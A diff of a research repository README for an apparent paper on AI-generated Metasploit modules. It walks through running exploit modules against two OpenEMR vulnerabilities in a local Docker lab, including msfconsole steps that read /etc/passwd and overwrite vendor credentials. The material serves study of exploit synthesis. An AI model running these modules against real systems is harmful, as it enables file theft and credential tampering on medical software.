@@ -14,34 +14,35 @@ Companion paper: "AMENDER: AI-Assisted Metasploit Exploit Module Synthesis via D
 
 AMENDER-2026/
 |-- data/
-|   +-- cve/
-|       |-- research_log_session2.md
-|       +-- cve_2026_24849_access_matrix.md
+| +-- cve/
+| |-- research_log_session2.md
+| +-- cve_2026_24849_access_matrix.md
 |-- docker/
-|   +-- docker-compose.yml
+| +-- docker-compose.yml
 |-- logs/
-|   |-- llm/
-|   |   |-- cve_2026_24849_faxsms_file_read.rb
-|   |   |-- cve_2026_24849_rcfax_dispose.rb
-|   |   |-- cve_2026_33305_save_setup.rb
-|   |   |-- cve_2026_24849_file_read.py
-|   |   |-- cve_2026_24849_original_poc.py
-|   |   +-- cve_2026_33305_save_setup.py
-|   +-- conformance/
+| |-- llm/
+| | |-- cve_2026_24849_faxsms_file_read.rb
+| | |-- cve_2026_24849_rcfax_dispose.rb
+| | |-- cve_2026_33305_save_setup.rb
+| | |-- cve_2026_24849_file_read.py
+| | |-- cve_2026_24849_original_poc.py
+| | +-- cve_2026_33305_save_setup.py
+| +-- conformance/
 |-- results/
-|   +-- evaluation/
-|       +-- evaluation_summary.md
+| +-- evaluation/
+| +-- evaluation_summary.md
 +-- src/
-    |-- modules/
-    |   |-- cve_2026_24849_faxsms_file_read.rb
-    |   |-- cve_2026_24849_rcfax_dispose.rb
-    |   +-- cve_2026_33305_save_setup.rb
-    |-- poc/
-    |   |-- cve_2026_24849_original_poc.py
-    |   |-- cve_2026_24849_file_read.py
-    |   +-- cve_2026_33305_save_setup.py
-    |-- openemr_cve_analysis.py          <- NVD API script; produces Fig. 1
-    +-- README.md                        <- usage for openemr_cve_analysis.py
+|-- modules/
+| |-- cve_2026_24849_faxsms_file_read.rb
+| |-- cve_2026_24849_rcfax_dispose.rb
+| +-- cve_2026_33305_save_setup.rb
+|-- poc/
+| |-- cve_2026_24849_original_poc.py
+| |-- cve_2026_24849_file_read.py
+| +-- cve_2026_33305_save_setup.py
+|-- openemr_cve_analysis.py <- NVD API script; produces Fig. 1
++-- README.md <- usage for openemr_cve_analysis.py
+
 
 ## CVE Enumeration Script (Figure 1)
 
@@ -53,7 +54,7 @@ See [`src/README.md`](src/README.md) for usage instructions and output format.
 
 | CVE | CVSS | Description |
 |-----|------|-------------|
-| CVE-2026-24849 | 9.9 Critical | Arbitrary file read/write via disposeDocument() in EtherFaxActions |
+| CVE-2026-24849 | 9.9 Critical | Arbitrary file read/write via `disposeDocument()` in EtherFaxActions |
 | CVE-2026-33305 | 5.4 Medium | Authorization bypass; AppDispatch dispatches actions before ACL checks |
 
 ## Prerequisites
@@ -64,19 +65,24 @@ See [`src/README.md`](src/README.md) for usage instructions and output format.
 
 ## Step 1 - Start the Lab Environment
 
+```bash
 cd docker/
 docker-compose up -d
+```
 
 This starts OpenEMR 7.0.2 on http://localhost:8080. Default credentials: admin / pass. Wait ~30 seconds before running any modules.
 
 ## Step 2 - Copy Metasploit Modules
 
+```bash
 cp src/modules/cve_2026_24849_faxsms_file_read.rb ~/.msf4/modules/auxiliary/gather/
 cp src/modules/cve_2026_24849_rcfax_dispose.rb     ~/.msf4/modules/auxiliary/gather/
 cp src/modules/cve_2026_33305_save_setup.rb        ~/.msf4/modules/auxiliary/gather/
+```
 
 ## Step 3 - Run CVE-2026-24849 Module (File Read)
 
+```bash
 msfconsole -q
 msf > reload_all
 msf > use auxiliary/gather/cve_2026_24849_faxsms_file_read
@@ -86,27 +92,34 @@ msf > set USERNAME admin
 msf > set PASSWORD pass
 msf > set TARGETFILE /etc/passwd
 msf > run
+```
 
 Expected: contents of /etc/passwd returned in module output.
 
 ## Step 4 - Run CVE-2026-33305 Module (Credential Injection)
 
+```bash
 msf > use auxiliary/gather/cve_2026_33305_save_setup
 msf > set RHOSTS 127.0.0.1
 msf > set RPORT 8300
 msf > set USERNAME admin
 msf > set PASSWORD pass
 msf > run
+```
 
 Expected: vendor credentials overwritten; module confirms write success.
 
 ## Step 5 - Verify with Python PoC (optional)
 
+```bash
 python3 src/poc/cve_2026_24849_file_read.py
+```
 
 ## Stopping the Lab
 
+```bash
 docker-compose down
+```
 
 ## Notes
 
